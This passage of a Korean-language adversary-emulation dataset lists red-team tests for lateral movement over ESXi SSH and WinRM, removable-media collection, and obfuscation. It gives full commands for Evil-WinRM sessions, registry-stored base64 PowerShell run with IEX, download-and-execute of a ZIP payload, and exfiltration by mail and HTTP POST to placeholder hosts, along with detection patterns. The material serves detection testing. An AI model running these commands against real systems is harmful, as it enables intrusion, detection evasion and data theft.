          "command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false; Connect-VIServer -Server <vm_host> -User <vm_user> -Password <vm_pass>; Get-VMHostService -VMHost <vm_host> | Where-Object { $_.Key -eq 'TSM-SSH' } | Start-VMHostService -Confirm:$false"
        }
      ],
      "prerequisites": [
        "Windows 시스템에 VMware.PowerCLI PowerShell 모듈이 설치되어 있어야 한다.",
        "테스트에 사용할 ESXi 호스트가 네트워크 상에서 접근 가능해야 하며, vSphere API(HTTPS) 포트(기본 443)가 열려 있어야 한다.",
        "vm_user 계정은 ESXi 호스트에서 서비스 시작/중지 권한을 가진 관리 권한이어야 한다.",
        "PowerShell 실행 정책 및 프록시/인증서 정책이 Connect-VIServer 호출을 허용해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "PowerCLI를 통해 ESXi에 연결하고 TSM-SSH 서비스를 시작하는 스크립트 실행",
            "commandline_pattern": "powershell.exe *Connect-VIServer*Get-VMHostService*TSM-SSH*Start-VMHostService*"
          }
        ],
        "network": [
          {
            "description": "Windows와 ESXi 호스트 사이의 vSphere API 통신(Connect-VIServer)",
            "protocol": "TCP",
            "port": 443
          }
        ]
      },
      "cleanup": [
        "동일한 PowerCLI 세션에서 Get-VMHostService -VMHost <vm_host> | Where-Object { $_.Key -eq 'TSM-SSH' } | Stop-VMHostService -Confirm:$false 명령으로 SSH 서비스를 중지할 수 있다.",
        "테스트용으로 사용한 ESXi 자격 증명 캐시/세션(Connect-VIServer 세션)을 Disconnect-VIServer 등으로 정리한다.",
        "SSH를 장기적으로 허용하고 싶지 않은 환경이라면, ESXi 호스트의 보안 정책에서 SSH 서비스를 비활성화 상태로 유지한다."
      ],
      "metadata": {
        "atomic_source_id": "8f6c14d1-f13d-4616-b7fc-98cc69fe56ec"
      }
    },
    {
      "test_id": "T1021.004-2",
      "name": "ESXi - Enable SSH via VIM-CMD over SSH (plink)",
      "platforms": ["windows"],
      "summary": "Windows에서 plink(putty CLI)를 사용해 ESXi 호스트에 SSH로 접속한 뒤, vim-cmd hostsvc/enable_ssh 명령을 실행해 SSH 서비스를 활성화한다. 별도 PowerCLI 없이도 단순 SSH 클라이언트만으로 ESXi 관리 인터페이스를 여는 패턴을 재현한다.",
      "procedure": [
        "테스트에 사용할 ESXi 호스트 주소(vm_host), root 계정(vm_user) 및 비밀번호(vm_pass)를 정한다.",
        "Windows 시스템에 plink.exe를 준비하고 경로(plink_file)를 확인한다.",
        "PowerShell 또는 CMD에서 plink.exe -ssh -l <vm_user> -pw <vm_pass> <vm_host> 명령을 통해 비대화형 SSH 세션을 열 준비를 한다.",
        "표준 입력(echo \"\")을 파이프로 연결하고, 원격 명령으로 'vim-cmd hostsvc/enable_ssh'를 실행하여 ESXi SSH 서비스를 활성화한다.",
        "성공 시 ESXi 호스트의 TSM-SSH 서비스가 활성화되고, 이후 SSH를 통한 상시 접속이 가능해진다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "echo \"\" | <plink_file> -batch <vm_host> -ssh -l <vm_user> -pw \"<vm_pass>\" \"vim-cmd hostsvc/enable_ssh\""
        }
      ],
      "prerequisites": [
        "Windows 시스템에 plink.exe(putty SSH 클라이언트)가 존재해야 하며, 해당 경로에 실행 권한이 있어야 한다.",
        "ESXi 호스트에서 SSH 데몬이 최소한 연결 허용 상태이며, vim-cmd hostsvc/enable_ssh 명령을 실행할 수 있을 정도의 root/관리자 권한 계정이 필요하다.",
        "Windows와 ESXi 사이의 TCP 22(SSH) 포트가 방화벽에서 허용되어 있어야 한다.",
        "비대화형 SSH 접속을 위해 계정의 패스워드 인증이 허용되어야 한다(키 기반 인증을 사용할 경우 명령을 별도로 조정)."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe",
            "description": "테스트 실행을 위해 다운로드된 plink SSH 클라이언트(이미 존재할 수도 있음)"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "echo 파이프와 plink를 호출하는 래퍼 프로세스",
            "commandline_pattern": "cmd.exe */c*plink.exe*-ssh*vim-cmd hostsvc/enable_ssh*"
          },
          {
            "name": "plink.exe",
            "description": "ESXi 호스트에 대한 SSH 접속 및 vim-cmd 명령 실행을 담당",
            "commandline_pattern": "plink.exe *-batch* -ssh -l*vim-cmd hostsvc/enable_ssh*"
          }
        ],
        "network": [
          {
            "description": "Windows에서 ESXi 호스트로 향하는 SSH 세션 트래픽",
            "protocol": "TCP",
            "port": 22
          }
        ]
      },
      "cleanup": [
        "동일한 방식으로 'vim-cmd hostsvc/disable_ssh' 명령을 실행해 ESXi 호스트의 SSH 서비스를 비활성화할 수 있다.",
        "테스트에 사용된 plink.exe가 불필요하다면 파일을 삭제하거나 보안적으로 관리되는 도구 폴더로 옮긴다.",
        "ESXi 환경에서 SSH 사용을 최소화하기 위해, 테스트 후에는 SSH 접근 제어(방화벽/관리 정책)를 다시 점검한다."
      ],
      "metadata": {
        "atomic_source_id": "280812c8-4dae-43e9-a74e-1d08ab997c0e"
      }
    }
  ]
},{
  "technique_id": "T1021.006",
  "technique_name": "Remote Services: Windows Remote Management",
  "tactic": "Lateral Movement",
  "description": "이 기법은 Windows Remote Management(WinRM)와 PowerShell Remoting을 이용해 원격 시스템에서 명령을 실행하거나 세션을 생성하는 방법이다. 공격자는 WinRM을 활성화하고 자격 증명을 이용해 원격 호스트에 접속함으로써, 파일 업로드·명령 실행·측면 이동 등의 활동을 수행할 수 있다.",

  "tests": [
    {
      "test_id": "T1021.006-1",
      "name": "Enable Windows Remote Management",
      "platforms": ["windows"],
      "summary": "로컬 시스템에서 Enable-PSRemoting -Force 명령을 실행해 WinRM과 PowerShell Remoting을 활성화하는 시나리오이다. 이를 통해 이후 원격 PowerShell 세션을 생성할 수 있는 기반을 마련한다.",
      "procedure": [
        "관리자 권한 PowerShell 콘솔을 연다.",
        "Enable-PSRemoting -Force 명령을 실행해 WinRM 서비스를 구성하고 필요 시 방화벽 규칙을 자동 생성한다.",
        "구성이 완료되면 WinRM 서비스가 실행 중이며, PowerShell Remoting이 허용된 상태가 된다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Enable-PSRemoting -Force"
        }
      ],
      "prerequisites": [
        "현재 계정이 로컬 시스템에서 관리자 권한을 가지고 있어야 한다.",
        "로컬 그룹 정책 또는 보안 설정이 WinRM/PSRemoting 구성을 차단하지 않아야 한다.",
        "방화벽 또는 보안 제품이 WinRM 관련 포트(HTTP 5985, HTTPS 5986)를 완전히 차단하지 않아야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\*",
            "description": "WinRM 및 WS-Management 구성 관련 레지스트리 값이 생성 또는 변경될 수 있음"
          }
        ],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Enable-PSRemoting 명령을 통해 WinRM 및 PowerShell Remoting을 활성화",
            "commandline_pattern": "powershell.exe *Enable-PSRemoting -Force*"
          },
          {
            "name": "winrm.cmd / wsmprovhost.exe",
            "description": "WinRM 서비스 및 관련 호스트 프로세스가 이후 원격 세션 처리에 사용될 수 있음",
            "commandline_pattern": "winrm* / wsmprovhost*"
          }
        ],
        "network": [
          {
            "description": "WinRM HTTP 리스너(기본 포트 5985)",
            "protocol": "TCP",
            "port": 5985
          }
        ]
      },
      "cleanup": [
        "PowerShell에서 Disable-PSRemoting -Force 명령을 실행해 WinRM 리스너 및 방화벽 예외를 비활성화할 수 있다.",
        "WinRM 서비스 구성을 초기화해야 하는 경우 winrm quickconfig /disable 또는 관련 그룹 정책 재적용을 고려한다."
      ],
      "metadata": {
        "atomic_source_id": "9059e8de-3d7d-4954-a322-46161880b9cf"
      }
    },
    {
      "test_id": "T1021.006-2",
      "name": "Remote Code Execution with PS Remoting Using Invoke-Command",
      "platforms": ["windows"],
      "summary": "로컬 시스템에서 WinRM을 활성화한 뒤, Invoke-Command를 이용해 자기 자신($env:COMPUTERNAME)을 원격 대상처럼 지정하고 whoami 명령을 실행하는 테스트이다. 실제로는 동일 호스트지만, PowerShell Remoting을 이용한 코드 실행 흐름을 재현한다.",
      "procedure": [
        "관리자 권한 PowerShell 세션을 연다.",
        "Enable-PSRemoting -Force 명령으로 WinRM과 PowerShell Remoting을 활성화한다.",
        "Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock { whoami } 를 실행하여 원격 코드 실행 흐름을 로컬에서 시뮬레이션한다.",
        "명령 실행 후 Disable-PSRemoting -Force 명령으로 WinRM 및 Remoting 설정을 비활성화한다(테스트 스크립트에 포함됨)."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Enable-PSRemoting -Force; Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock { whoami }; Disable-PSRemoting -Force"
        }
      ],
      "prerequisites": [
        "테스트를 실행하는 계정은 관리자 권한이어야 하며 WinRM 구성 변경이 가능해야 한다.",
        "로컬 호스트에서 WinRM 서비스 및 관련 방화벽 규칙 구성을 허용해야 한다.",
        "보안 정책이 Invoke-Command를 이용한 Remoting 사용을 완전히 금지하지 않아야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\*",
            "description": "Enable-PSRemoting / Disable-PSRemoting 실행에 따라 WinRM 구성 레지스트리 값이 변경"
          }
        ],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Enable-PSRemoting, Invoke-Command, Disable-PSRemoting를 실행하는 PowerShell 세션",
            "commandline_pattern": "powershell.exe *Invoke-Command -ComputerName*whoami*"
          },
          {
            "name": "wsmprovhost.exe",
            "description": "Invoke-Command 호출 시 생성되는 PowerShell Remoting 호스트 프로세스",
            "commandline_pattern": "wsmprovhost.exe"
          }
        ],
        "network": [
          {
            "description": "로컬 호스트를 대상으로 하는 WinRM 트래픽(Loopback 또는 로컬 네트워크 상 자기 자신)",
            "protocol": "TCP",
            "port": 5985
          }
        ]
      },
      "cleanup": [
        "테스트 스크립트 내 Disable-PSRemoting -Force가 WinRM 리스너 및 방화벽 예외를 비활성화하므로, 실행 후 Remoting이 다시 차단된다.",
        "추가적으로 필요하다면 winrm delete winrm/config/Listener 등으로 리스너 구성을 수동 초기화할 수 있다.",
        "원격 코드 실행 테스트에 사용한 PowerShell 히스토리(history) 정리를 고려할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "5295bd61-bd7e-4744-9d52-85962a4cf2d6"
      }
    },
    {
      "test_id": "T1021.006-3",
      "name": "WinRM Access with Evil-WinRM",
      "platforms": ["windows"],
      "summary": "Evil-WinRM 도구를 사용해 WinRM이 활성화된 원격 Windows 시스템에 접속하는 시나리오를 모사한다. 공격자는 유효한 도메인 계정과 비밀번호를 사용하여 evil-winrm -i <host> -u <user> -p <password> 명령으로 원격 명령 실행 콘솔을 획득할 수 있다.",
      "procedure": [
        "테스트용 Windows 시스템에 Ruby 런타임을 설치한다(예: rubyinstaller를 사용).",
        "gem install evil-winrm 명령으로 Evil-WinRM Ruby Gem을 설치한다.",
        "대상 시스템(destination_address)에서 WinRM(HTTP/HTTPS)이 활성화되어 있고, 입력한 계정(user_name, password)이 원격 접속 권한을 가지고 있는지 확인한다.",
        "PowerShell 또는 CMD에서 evil-winrm -i <destination_address> -u <user_name> -p <password> 를 실행해 원격 WinRM 세션을 연다.",
        "세션 내에서 명령 실행, 파일 업로드/다운로드 등 추가적인 측면 이동 활동을 수행할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "evil-winrm -i <destination_address> -u <user_name> -p <password>"
        }
      ],
      "prerequisites": [
        "로컬 시스템에 Ruby가 설치되어 있어야 하며, gem 명령으로 Evil-WinRM을 설치할 수 있어야 한다.",
        "evil-winrm 명령이 PATH에 존재하거나 전체 경로로 호출 가능해야 한다.",
        "대상 호스트에서 WinRM 서비스가 활성화되어 있고, 방화벽에서 TCP 5985(HTTP)/5986(HTTPS)이 허용되어 있어야 한다.",
        "user_name / password 조합이 유효한 도메인/로컬 계정이며, WinRM 접속 권한 및 필요한 권한(예: Remote Management Users 그룹 포함 등)을 가지고 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "RubyGems 설치 경로 내 evil-winrm 관련 파일",
            "description": "gem install evil-winrm 실행 시 생성되는 Evil-WinRM 루비 Gem 및 바이너리 스크립트"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "evil-winrm 명령을 실행하는 PowerShell 또는 콘솔 세션",
            "commandline_pattern": "powershell.exe *evil-winrm -i* -u* -p*"
          },
          {
            "name": "ruby.exe",
            "description": "Evil-WinRM 루비 스크립트를 실제로 구동하는 Ruby 인터프리터 프로세스",
            "commandline_pattern": "ruby.exe *evil-winrm*"
          }
        ],
        "network": [
          {
            "description": "로컬에서 대상 호스트로 향하는 WinRM 세션(Evil-WinRM)",
            "protocol": "TCP",
            "port": 5985
          },
          {
            "description": "환경에 따라 HTTPS(WinRM over TLS)를 사용할 수도 있음",
            "protocol": "TCP",
            "port": 5986
          }
        ]
      },
      "cleanup": [
        "테스트 후 evil-winrm 사용이 불필요하다면 gem uninstall evil-winrm 명령으로 제거할 수 있다.",
        "Ruby 자체가 불필요하면 Ruby 런타임을 제거해 재사용 가능성을 줄일 수 있다.",
        "대상 환경에서는 WinRM을 비활성화하거나, 신뢰된 관리 호스트에서만 접근 가능하도록 방화벽/네트워크 세분화를 재점검한다.",
        "테스트에서 사용한 계정 비밀번호를 변경하는 등 크리덴셜 노출 위험을 줄이는 조치를 수행한다."
      ],
      "metadata": {
        "atomic_source_id": "efe86d95-44c4-4509-ae42-7bfd9d1f5b3d"
      }
    }
  ]
},
{
  "technique_id": "T1025",
  "technique_name": "Data from Removable Media",
  "tactic": "Collection",
  "description": "이 기법은 USB 메모리나 기타 이동식 저장매체에 저장된 데이터를 탐색·수집하는 활동을 의미한다. 공격자는 연결된 드라이브를 식별한 뒤, 문서 파일 등 민감 정보가 포함될 가능성이 높은 확장자를 중심으로 검색해 이후 유출(Exfiltration) 또는 분석에 활용한다.",

  "tests": [
    {
      "test_id": "T1025-1",
      "name": "Identify Documents on USB and Removable Media via PowerShell",
      "platforms": ["windows"],

      "summary": "PowerShell을 통해 현재 시스템에 연결된 이동식(Removable) 드라이브를 탐지하고, 각 드라이브에서 .docx, .xls, .txt, .pdf 등 문서 파일을 재귀적으로 검색한다. 이동식 드라이브가 없으면 'No removable media.'라는 메시지만 출력된다. 공격자가 USB 등에서 민감 문서를 수집하기 전 사전 탐색 단계로 활용할 수 있는 패턴이다.",

      "procedure": [
        "cmd.exe 또는 콘솔에서 제공된 PowerShell 호출 명령을 실행한다.",
        "PowerShell에서 Get-Volume으로 드라이브 목록을 조회한 뒤 DriveType이 'Removable'인 볼륨만 필터링한다.",
        "각 이동식 드라이브에 대해 Get-ChildItem -Recurse -Include를 사용해 .doc*, .xls*, .txt, .pdf 확장자를 가진 파일을 모두 탐색한다.",
        "발견된 각 파일의 전체 경로(FullName)를 표준 출력으로 출력한다.",
        "만약 이동식 드라이브가 하나도 없으면 'No removable media.'라는 메시지를 출력하고 종료한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "command": "powershell.exe -c \"Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }\""
        }
      ],

      "prerequisites": [
        "테스트 대상 Windows 시스템에 PowerShell이 설치·활성화되어 있어야 한다(기본 Windows 10/11 환경이면 충족).",
        "이동식 저장매체(USB, 외장 HDD 등)를 연결해야 실제 파일 경로가 출력된다. 연결되지 않은 경우에는 'No removable media.'만 출력된다.",
        "현재 사용자 계정이 이동식 드라이브 내 파일에 대한 읽기 권한을 가지고 있어야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": "<RemovableDrive>:\\**\\*.doc*",
            "description": "이동식 드라이브 내 Word 계열 문서 파일을 재귀적으로 나열"
          },
          {
            "path": "<RemovableDrive>:\\**\\*.xls*",
            "description": "이동식 드라이브 내 Excel 계열 문서 파일을 재귀적으로 나열"
          },
          {
            "path": "<RemovableDrive>:\\**\\*.txt",
            "description": "이동식 드라이브 내 텍스트 파일을 재귀적으로 나열"
          },
          {
            "path": "<RemovableDrive>:\\**\\*.pdf",
            "description": "이동식 드라이브 내 PDF 문서 파일을 재귀적으로 나열"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "PowerShell을 호출해 이동식 드라이브 검색 스크립트를 실행하는 콘솔 프로세스",
            "commandline_pattern": "cmd.exe */c powershell.exe -c Get-Volume*"
          },
          {
            "name": "powershell.exe",
            "description": "Get-Volume / Get-ChildItem을 사용해 Removable 드라이브 및 문서 파일을 검색",
            "commandline_pattern": "powershell.exe -c Get-Volume*DriveType -eq 'Removable'*Get-ChildItem* -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf'*"
          }
        ],
        "network": []
      },

      "cleanup": [
        "해당 테스트는 파일을 생성하거나 수정하지 않고 파일 목록만 출력하므로 별도의 클린업 작업은 필요 없다.",
        "콘솔 히스토리에 명령이 남는 것이 우려된다면 PowerShell/명령 프롬프트 명령 기록을 수동으로 지울 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "0b29f7e3-a050-44b7-bf05-9fb86af1ec2e"
      }
    }
  ]
},
{
  "technique_id": "T1027",
  "technique_name": "Obfuscated Files or Information",
  "tactic": "Defense Evasion",
  "description": "이 기법은 탐지 회피를 위해 코드, 스크립트, 페이로드, 네트워크 통신 내용을 난독화하거나 압축·암호화·인코딩하는 것을 의미한다.\n공격자는 Base64, 압축 파일, 스크립트 난독화, 특수 유니코드 문자 등을 활용해 분석을 어렵게 만들고 DLP나 AV, EDR 탐지를 우회한다.\n또한 레지스트리·문서 매크로·은닉 파일 등과 결합해 지속성 확보, 데이터 유출 은닉, 명령 실행 경로 은폐에 활용된다.",

  "tests": [
    {
      "test_id": "T1027-1",
      "name": "Execute base64-encoded PowerShell",
      "platforms": ["windows"],
      "summary": "PowerShell 명령을 Base64로 인코딩한 뒤, -EncodedCommand 옵션으로 재실행하는 패턴을 시뮬레이션한다. 이는 많은 악성코드와 공격자가 탐지 우회를 위해 사용하는 전형적인 난독화 기법이다.",
      "procedure": [
        "원본 PowerShell 명령 문자열(예: Write-Host \"Hey, Atomic!\")을 준비한다.",
        "명령 문자열을 Unicode 바이트 배열로 변환한다.",
        "바이트 배열을 Base64 문자열로 인코딩한다.",
        "powershell.exe -EncodedCommand <Base64> 형식으로 인코딩된 명령을 실행한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand = [Convert]::ToBase64String($Bytes)\n$EncodedCommand\npowershell.exe -EncodedCommand $EncodedCommand"
        }
      ],
      "prerequisites": [
        "Windows 환경에 PowerShell이 설치·활성화되어 있어야 한다.",
        "실행 계정이 powershell.exe 실행 권한을 가지고 있어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "-EncodedCommand 인자를 사용해 Base64로 인코딩된 스크립트를 실행",
            "commandline_pattern": "powershell.exe -EncodedCommand *"
          }
        ],
        "network": []
      },
      "cleanup": [
        "별도 파일이나 레지스트리를 남기지 않으므로 별도 클린업은 필요 없다.",
        "콘솔 명령 기록을 지우고 싶다면 PowerShell/콘솔 히스토리를 수동으로 정리할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "a50d5a97-2531-499e-a1de-5544c74432c6"
      }
    },

    {
      "test_id": "T1027-2",
      "name": "Execute base64-encoded PowerShell from Windows Registry",
      "platforms": ["windows"],
      "summary": "Base64 인코딩된 PowerShell 코드를 레지스트리에 저장한 뒤, 실행 시 레지스트리에서 읽어 디코딩·실행하는 패턴을 시뮬레이션한다. 이는 코드 저장 위치를 은폐하기 위해 자주 사용되는 기법이다.",
      "procedure": [
        "원본 PowerShell 명령(예: Write-Host \"Hey, Atomic!\")을 Unicode 바이트 배열로 변환한다.",
        "바이트 배열을 Base64 문자열로 인코딩한다.",
        "지정된 레지스트리 키(예: HKCU:Software\\Microsoft\\Windows\\CurrentVersion)와 값 이름(예: Debug)에 Base64 문자열을 저장한다.",
        "powershell.exe에서 레지스트리 값을 읽어 Base64 디코딩 후 IEX(Invoke-Expression)으로 실행한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand = [Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))\""
        }
      ],
      "prerequisites": [
        "PowerShell 실행 가능해야 하며, HKCU 또는 지정된 레지스트리 키에 쓰기 권한이 필요하다.",
        "레지스트리에 악성/난독화 코드를 저장하는 행위는 보안 솔루션 탐지 대상이 될 수 있다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion",
            "description": "기본값 기준, Debug 등의 값 이름 아래 Base64 인코딩된 PowerShell 코드가 저장됨"
          }
        ],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "레지스트리에서 Base64 문자열을 읽어 디코딩 후 IEX로 실행",
            "commandline_pattern": "powershell.exe -Command IEX *FromBase64String*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Set-ItemProperty로 생성한 레지스트리 값을 Remove-ItemProperty로 삭제해 흔적을 제거할 수 있다.",
        "PowerShell 히스토리나 이벤트 로그(Operational 로그 등)를 점검·정리할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "450e7218-7915-4be4-8b9b-464a49eafcec"
      }
    },

    {
      "test_id": "T1027-3",
      "name": "Execution from Compressed File (ZIP EXE)",
      "platforms": ["windows"],
      "summary": "압축 파일(ZIP) 내부에 존재하는 실행 파일(T1027.exe)을 다운로드 후 압축 해제하여 실행하는 시나리오를 모사한다. GZ/ZIP 등 압축을 이용해 페이로드를 은닉해 전송한 뒤, 로컬에서 풀어 실행하는 전형적인 난독화·전달 방식이다.",
      "procedure": [
        "외부 URL에서 T1027.zip 파일을 다운로드한다.",
        "지정된 폴더(PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\)에 압축을 해제하여 T1027.exe를 생성한다.",
        "압축 해제된 T1027.exe를 직접 실행하여(예: calculator.exe 실행) 페이로드 동작을 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"#{url_path}\" -OutFile \"PathToAtomicsFolder..\\ExternalPayloads\\T1027.zip\"\nExpand-Archive -path \"PathToAtomicsFolder..\\ExternalPayloads\\T1027.zip\" -DestinationPath \"PathToAtomicsFolder..\\ExternalPayloads\\temp_T1027.zip\\\" -Force"
        },
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "PathToAtomicsFolder..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe"
        }
      ],
      "prerequisites": [
        ".NET 및 PowerShell에서 TLS 1.2를 사용해 외부 URL에 접속 가능해야 한다.",
        "테스트 환경이 인터넷에 연결되어 있어야 하며, Invoke-WebRequest와 Expand-Archive 사용이 허용되어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1027.zip",
            "description": "외부에서 다운로드한 압축 파일"
          },
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe",
            "description": "압축 해제된 실행 파일(계산기 실행용)"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe",
            "description": "실행 시 OS Loader에 의해 읽히는 PE 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "T1027.exe",
            "description": "압축에서 풀어 실행한 테스트 실행 파일"
          },
          {
            "name": "calculator.exe / CalculatorApp.exe",
            "description": "테스트 성공 시 보여지는 계산기 프로세스"
          }
        ],
        "network": [
          {
            "description": "Invoke-WebRequest로 #{url_path}에 대한 HTTP(S) 요청",
            "destination": "#{url_path}"
          }
        ]
      },
      "cleanup": [
        "taskkill /f /im calculator.exe, CalculatorApp.exe 등을 통해 생성된 계산기 프로세스를 종료할 수 있다.",
        "T1027.zip 및 temp_T1027.zip 폴더를 삭제하여 테스트용 파일을 정리할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "f8c8a909-5f29-49ac-9244-413936ce6d1f"
      }
    },

    {
      "test_id": "T1027-4",
      "name": "DLP Evasion via Sensitive Data in VBA Macro over Email",
      "platforms": ["windows"],
      "summary": "신용카드 번호 등 민감 데이터를 VBA 매크로 내부에 포함한 XLSM 파일을 이메일 첨부로 외부로 전송하는 시나리오를 모사한다. 정적 DLP 정책이 평문 텍스트만 검사할 때, 매크로 내부에 숨겨진 데이터로 탐지를 우회하는 패턴이다.",
      "procedure": [
        "민감 데이터를 포함하는 VBA 매크로(XLSM) 파일 경로를 준비한다.",
        "PowerShell의 Send-MailMessage cmdlet을 사용해 지정된 SMTP 서버로 메일을 전송한다.",
        "메일 본문 또는 첨부파일로 매크로 파일을 전송해 DLP 탐지 회피 가능성을 시험한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments \"#{input_file}\" -SmtpServer #{smtp_server}"
        }
      ],
      "prerequisites": [
        "지정된 경로에 T1027-cc-macro.xlsm 파일이 존재해야 한다.",
        "테스트용 SMTP 서버(예: 내부 테스트 서버)가 준비되어 있어야 하며, Send-MailMessage가 허용되어야 한다.",
        "방화벽·프록시 설정이 SMTP 트래픽을 허용해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm",
            "description": "민감 데이터를 포함한 VBA 매크로 파일을 메일 첨부로 사용"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Send-MailMessage cmdlet을 사용해 매크로 파일 첨부 메일 전송",
            "commandline_pattern": "powershell.exe *Send-MailMessage* -Attachments *T1027-cc-macro.xlsm*"
          }
        ],
        "network": [
          {
            "description": "SMTP 서버 #{smtp_server}로의 메일 전송 트래픽",
            "destination": "#{smtp_server}:25"
          }
        ]
      },
      "cleanup": [
        "테스트용 메일 서버 또는 클라이언트에서 전송된 테스트 메일을 삭제할 수 있다.",
        "필요 시 T1027-cc-macro.xlsm 파일을 제거하여 재사용을 방지할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "129edb75-d7b8-42cd-a8ba-1f3db64ec4ad"
      }
    },

    {
      "test_id": "T1027-5",
      "name": "DLP Evasion via Sensitive Data in VBA Macro over HTTP",
      "platforms": ["windows"],
      "summary": "민감 데이터를 포함한 XLSM 매크로 파일 경로를 HTTP 요청 본문으로 전송하는 패턴을 시뮬레이션한다. 파일 내용 또는 경로를 HTTP POST로 내보내 DLP/웹 필터링 정책을 우회하려는 시나리오를 표현한다.",
      "procedure": [
        "민감 데이터를 포함한 VBA 매크로(XLSM) 파일 경로를 준비한다.",
        "Invoke-WebRequest를 사용해 지정된 IP 주소로 HTTP POST 요청을 전송한다.",
        "요청 Body에 파일 경로나 내용을 담아 외부로 유출하는 상황을 모사한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Invoke-WebRequest -Uri #{ip_address} -Method POST -Body \"#{input_file}\""
        }
      ],
      "prerequisites": [
        "테스트 대상 IP(수신 서버)가 HTTP POST 요청을 수신할 수 있어야 한다.",
        "방화벽·프록시 정책이 해당 IP로의 HTTP 트래픽을 허용해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm",
            "description": "HTTP POST로 전송 대상으로 사용하는 매크로 파일 경로"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Invoke-WebRequest로 HTTP POST 요청 생성",
            "commandline_pattern": "powershell.exe *Invoke-WebRequest* -Method POST*"
          }
        ],
        "network": [
          {
            "description": "HTTP POST 요청으로 민감 데이터 또는 파일 경로를 외부로 전송",
            "destination": "#{ip_address}:80"
          }
        ]
      },
      "cleanup": [
